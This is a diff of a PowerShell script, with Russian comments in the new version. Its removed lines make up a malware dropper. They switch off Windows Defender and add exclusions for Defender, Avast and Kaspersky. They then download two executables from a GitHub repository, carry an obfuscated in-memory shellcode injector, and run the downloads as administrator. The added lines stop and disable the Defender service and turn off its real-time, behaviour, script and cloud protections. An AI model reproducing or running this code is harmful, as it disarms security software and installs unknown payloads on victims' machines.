@@ -1,178 +1,66 @@
-# Function for disabling Windows Defender Real-Time Protection
-function Disable-WindowsDefender-RealTimeProtection {
-    try {
-        Set-MpPreference -DisableRealtimeMonitoring $true
-        Write-Output "Windows Defender Real-Time Protection disabled."
-    } catch {
-        Write-Error "Error disabling Windows Defender Real-Time Protection: $_"
-    }
+# Запуск PowerShell с правами администратора
+if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
+    Write-Host "Пожалуйста, запустите этот скрипт от имени администратора." -ForegroundColor Red
+    exit
 }
 
-# Function to add a file to Windows Defender exclusions
-function Add-To-WindowsDefender-Exclusion {
+# Функция для проверки состояния защиты в режиме реального времени
+function Check-RealTimeMonitoring {
     param (
-        [string]$filePath
+        [string]$message
     )
+    $realTimeMonitoring = Get-MpPreference | Select-Object -ExpandProperty DisableRealtimeMonitoring
+    Write-Host "$message: $realTimeMonitoring" -ForegroundColor Yellow
+}
 
-    if (-Not (Test-Path -Path $filePath)) {
-        Write-Warning "File $filePath not found."
-        return
-    }
+# Проверяем текущее состояние защиты в режиме реального времени
+Check-RealTimeMonitoring -message "Текущее состояние защиты в режиме реального времени"
 
+# Отключаем реальный защитник
+Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
+
+# Проверяем состояние после изменения
+Check-RealTimeMonitoring -message "Состояние защиты в режиме реального времени после изменения"
+
+# Если защита в режиме реального времени всё ещё включена, пробуем остановить службу
+if ((Get-MpPreference).DisableRealtimeMonitoring -eq $false) {
+    Write-Host "Защита в режиме реального времени не отключена. Пробуем остановить службу Windows Defender..." -ForegroundColor Red
+
+    # Останавливаем службу Windows Defender
     try {
-        $currentExclusions = Get-MpPreference | Select-Object -ExpandProperty ExclusionPath
-
-        if ($currentExclusions -contains $filePath) {
-            Write-Output "File $filePath is already in Windows Defender exclusions."
-        } else {
-            Add-MpPreference -ExclusionPath $filePath
-            Write-Output "File $filePath successfully added to Windows Defender exclusions."
-        }
+        Stop-Service -Name WinDefend -Force
+        Write-Host "Служба Windows Defender остановлена." -ForegroundColor Green
     } catch {
-        Write-Error "Error adding file $filePath to Windows Defender exclusions: $_"
-    }
-}
-
-# Function to add file to Avast exclusions
-function Add-To-Avast-Exclusion {
-    param (
-        [string]$filePath
-    )
-
-    if (-Not (Test-Path -Path $filePath)) {
-        Write-Warning "File $filePath not found."
-        return
+        Write-Host "Не удалось остановить службу Windows Defender: $_" -ForegroundColor Red
     }
 
+    # Отключаем автозагрузку службы Windows Defender
     try {
-        $avastProcess = Get-Process -Name avast -ErrorAction SilentlyContinue
-        if ($avastProcess) {
-            Start-Process -FilePath "C:\Program Files\AVAST Software\Avast\avast.exe" -ArgumentList "/exclude add $filePath" -Verb RunAs -Wait
-            Write-Output "File $filePath successfully added to Avast exclusions."
-        } else {
-            Write-Warning "Avast Antivirus not running."
-        }
+        Set-Service -Name WinDefend -StartupType Disabled
+        Write-Host "Автозагрузка службы Windows Defender отключена." -ForegroundColor Green
     } catch {
-        Write-Error "Error adding file $filePath to Avast exclusions: $_"
+        Write-Host "Не удалось отключить автозагрузку службы Windows Defender: $_" -ForegroundColor Red
     }
+} else {
+    Write-Host "Защита в режиме реального времени успешно отключена через настройки." -ForegroundColor Green
 }
 
-# Function to add file to Kaspersky exclusions
-function Add-To-Kaspersky-Exclusion {
-    param (
-        [string]$filePath
-    )
+# Отключаем обнаружение вредоносных программ
+Set-MpPreference -DisableBehaviorMonitoring $true -ErrorAction SilentlyContinue
 
-    if (-Not (Test-Path -Path $filePath)) {
-        Write-Warning "File $filePath not found."
-        return
-    }
+# Отключаем защиту от угроз
+Set-MpPreference -DisableIOAVProtection $true -ErrorAction SilentlyContinue
 
-    try {
-        $kasperskyProcess = Get-Process -Name avp -ErrorAction SilentlyContinue
-        if ($kasperskyProcess) {
-            Start-Process -FilePath "C:\Program Files (x86)\Kaspersky Lab\Kaspersky Anti-Virus 20.xx\avp.com" -ArgumentList "/add-exclusion=$filePath" -Verb RunAs -Wait
-            Write-Output "File $filePath successfully added to Kaspersky exclusions."
-        } else {
-            Write-Warning "Kaspersky Antivirus not running."
-        }
-    } catch {
-        Write-Error "Error adding file $filePath to Kaspersky exclusions: $_"
-    }
-}
+# Отключаем защиту эксплуатации
+Set-MpPreference -DisableScriptScanning $true -ErrorAction SilentlyContinue
 
-# Function to unblock file
-function Unblock-FileIfBlocked {
-    param (
-        [string]$filePath
-    )
-    if (Test-Path -Path $filePath) {
-        Unblock-File -Path $filePath
-        Write-Output "File $filePath unblocked."
-    } else {
-        Write-Warning "File $filePath not found or access is restricted."
-    }
-}
+# Отключаем автоматическое определение и удаление вредоносного ПО
+Set-MpPreference -DisableBlockAtFirstSeen $true -ErrorAction SilentlyContinue
 
-# Function to set full access to file
-function Set-FullAccessTo-File {
-    param (
-        [string]$filePath
-    )
-    try {
-        $acl = Get-Acl $filePath
-        $permissions = "BUILTIN\Users", "FullControl", "Allow"
-        $rule = New-Object System.Security.AccessControl.FileSystemAccessRule $permissions
-        $acl.AddAccessRule($rule)
-        Set-Acl $filePath $acl
-        Write-Output "Full access set for file ${filePath}."
-    } catch {
-        Write-Error "Error setting full access for file ${filePath}: $_"
-    }
-}
+# Отключаем отправку образцов файлов Microsoft
+Set-MpPreference -SubmitSamplesConsent 2 -ErrorAction SilentlyContinue
 
-# Downloading files
-$file1 = "C:\1.exe"
-$file2 = "C:\2.exe"
-try {
-    Invoke-WebRequest -Uri "https://github.com/cs2cc/s/raw/main/1.exe" -OutFile $file1
-    Write-Output "File 1.exe successfully downloaded."
-} catch {
-    Write-Error "Error downloading file 1.exe: $_"
-}
+# Отключаем отправку отчетов о вредоносных программах
+Set-MpPreference -MAPSReporting 0 -ErrorAction SilentlyContinue
 
-try {
-    Invoke-WebRequest -Uri "https://github.com/cs2cc/s/raw/main/2.exe" -OutFile $file2
-    Write-Output "File 2.exe successfully downloaded."
-} catch {
-    Write-Error "Error downloading file 2.exe: $_"
-}
-
-# Unblocking and setting full access to files
-Unblock-FileIfBlocked -filePath $file1
-Unblock-FileIfBlocked -filePath $file2
-Set-FullAccessTo-File -filePath $file1
-Set-FullAccessTo-File -filePath $file2
-
-# Adding files to Windows Defender exclusions
-Add-To-WindowsDefender-Exclusion -filePath $file1
-Add-To-WindowsDefender-Exclusion -filePath $file2
-
-# Adding files to Avast exclusions
-Add-To-Avast-Exclusion -filePath $file1
-Add-To-Avast-Exclusion -filePath $file2
-
-# Adding files to Kaspersky exclusions
-Add-To-Kaspersky-Exclusion -filePath $file1
-Add-To-Kaspersky-Exclusion -filePath $file2
-
-# Shellcode injection functions
-function potatoes {
-    Param ($cherries, $pineapple)
-    $tomatoes = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
-    $turnips=@()
-    $tomatoes.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$turnips+=$_}}
-    return $turnips[0].Invoke($null, @(($tomatoes.GetMethod('GetModuleHandle')).Invoke($null, @($cherries)), $pineapple))
-}
-
-function apples {
-    Param (
-    [Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,
-    [Parameter(Position = 1)] [Type] $delType = [Void]
-    )
-    $type = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass',[System.MulticastDelegate])
-    $type.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $func).SetImplementationFlags('Runtime, Managed')
-    $type.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).SetImplementationFlags('Runtime, Managed')
-    return $type.CreateType()
-}
-
-$cucumbers = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((potatoes kernel32.dll VirtualAlloc), (apples @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, 0x1000, 0x3000, 0x40)
-[Byte[]] $buf = <insert shellcode here>
-[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $cucumbers, $buf.length)
-$parsnips =
-[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((potatoes kernel32.dll CreateThread), (apples @([IntPtr], [UInt32], [IntPtr], [IntPtr],[UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$cucumbers,[IntPtr]::Zero,0,[IntPtr]::Zero)
-[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((potatoes kernel32.dll WaitForSingleObject), (apples @([IntPtr], [Int32]) ([Int]))).Invoke($parsnips, 0xFFFFFFFF)
-
-# Final execution of files with admin rights
-Start-Process -FilePath $file1 -Verb RunAs
-Start-Process -FilePath $file2 -Verb RunAs
+Write-Host "Дополнительные настройки Windows Defender отключены." -ForegroundColor Green
